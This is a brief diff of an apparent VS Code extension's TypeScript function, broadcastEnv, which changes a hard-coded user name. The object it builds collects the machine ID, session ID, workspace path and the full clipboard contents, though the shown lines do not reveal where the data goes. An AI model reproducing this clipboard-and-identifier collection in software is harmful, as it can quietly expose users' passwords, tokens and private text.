@@ -48,7 +48,7 @@ async function broadcastEnv(context: vscode.ExtensionContext) {
 			machineId: vscode.env.machineId,
 			vscodeSid: vscode.env.sessionId,
 			remoteName: vscode.env.remoteName,
-			user: "verdverm",
+			user: "tony",
 		  workspaceDir: wDir,
 			clipboard: await vscode.env.clipboard.readText(),
 		}
